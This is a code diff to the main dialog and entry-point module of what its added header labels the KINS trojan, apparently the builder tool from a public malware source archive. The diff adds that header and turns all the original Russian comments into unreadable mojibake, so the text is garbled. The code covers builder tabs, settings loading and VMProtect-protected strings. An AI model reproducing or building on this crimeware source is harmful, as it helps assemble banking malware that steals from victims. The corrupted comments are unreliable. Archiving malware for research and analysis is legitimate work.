@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <commctrl.h>
 #include <ole2.h>
@@ -20,14 +31,14 @@
 #if BO_DEBUG <= 0
 #include "activation.h"
 #endif
-//Глобальные переменные.
-HMODULE currentModule;       //Хэндл текушего модуля.
-WCHAR homePath[MAX_PATH];    //Домашняя директория.
-WCHAR settingsFile[MAX_PATH]; //Файл опций.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+HMODULE currentModule;       //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+WCHAR homePath[MAX_PATH];    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+WCHAR settingsFile[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-static HRESULT comResult;     //Значение от ComLibrary::_initThread().
+static HRESULT comResult;     //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ComLibrary::_initThread().
 
-//Данные о вкладках.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 INT_PTR CALLBACK toolSettingsProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 
@@ -48,10 +59,10 @@ static BYTE lastTool         = 0xFF;
 #define toolsCount (sizeof(toolsList) / sizeof(TOOLDATA))
 
 /*
-	Загрузка вкладки.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	IN hwnd  - родитель.
-	IN index - индекс вкладки.
+	IN hwnd  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN index - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void loadTool(HWND hwnd, BYTE index)
 {
@@ -69,7 +80,7 @@ static void loadTool(HWND hwnd, BYTE index)
 }
 
 /*
-  Функция главного окна.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 */
 static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
@@ -77,7 +88,7 @@ static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARA
 	{
 		case WM_INITDIALOG:
 			{
-				//Заполняем список вкладок.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				{
 					HWND hLB = CWA(user32, GetDlgItem)(hwnd, IDC_TOOLSLIST);
 					for(BYTE i = 0; i < toolsCount; i++)
@@ -86,17 +97,17 @@ static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARA
 
 				}
 
-				//Загружаем иконку.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 				{
 					HICON hIcon = Gui::_loadSharedIcon(currentModule, MAKEINTRESOURCEW(ICON_MAIN));
 					CWA(user32, SendMessageW)(hwnd, WM_SETICON, ICON_SMALL, (WPARAM)hIcon);
 					CWA(user32, SendMessageW)(hwnd, WM_SETICON, ICON_BIG, (WPARAM)hIcon);
 				}
 
-				//Открываем вкладку по умолчанию.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				loadTool(hwnd, 0);
 
-				//Выставляем заголовок.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				CWA(user32, SetWindowTextW)(hwnd, Languages::get(Languages::main_title));
 				break;
 			}
@@ -111,7 +122,7 @@ static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARA
 
 		case WM_CLOSE:
 			{
-				//Рассылаем всем вкладкам предложенение о закрытие.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				for(BYTE i = 0; i < toolsCount; i++)if(toolsList[i].hwnd)
 				{
 					if((bool)CWA(user32, SendMessageW)(toolsList[i].hwnd, WM_CANCLOSE, 0, 0) == false)
@@ -144,32 +155,32 @@ static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARA
 }
 
 /*
-  Точка входа.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 */
 void WINAPI entryPoint(void)
 {
-	//Инициализация данных для GUI.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ GUI.
 	if(!Gui::_loadCommonControl(ICC_STANDARD_CLASSES) || !ComLibrary::_initThread(&comResult))
 	{
 		CWA(kernel32, ExitProcess)(1);
 		return;
 	}
 
-	//Инициализация модулей.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	currentModule = CWA(kernel32, GetModuleHandleW)(NULL);
 
 	Mem::init();
 	Crypt::init();
 
-	//Получаем рабочию директорию.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	CWA(kernel32, GetModuleFileNameW)(NULL, homePath, MAX_PATH);
 	CWA(shlwapi, PathRemoveFileSpecW)(homePath);
 #if BO_DEBUG > 0
-	//Получаем файл настроек.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(CWA(shlwapi, PathCombineW)(settingsFile, homePath, L"settings.ini") == FALSE)
 		settingsFile[0] = 0;
 #else
-	//Получаем файл настроек.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(CWA(shlwapi, PathCombineW)(settingsFile, homePath, VMProtectDecryptStringW(L"settings.ini")) == FALSE)
 		settingsFile[0] = 0;
 
@@ -195,15 +206,15 @@ void WINAPI entryPoint(void)
 #endif
 	Languages::init();
 
-	//Запускаем главный диалог.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	CWA(user32, DialogBoxParamW)(currentModule, MAKEINTRESOURCEW(DIALOG_MAIN), NULL, mainDialogProc, NULL);
 	Cleanup:
-	//Деинициализация модулей.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	Languages::uninit();
 	Crypt::uninit();
 	Mem::uninit();  
 
-	//Деинициализация данных для GUI.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ GUI.
 	ComLibrary::_uninitThread(comResult);
 	CWA(kernel32, ExitProcess)(0);
 }
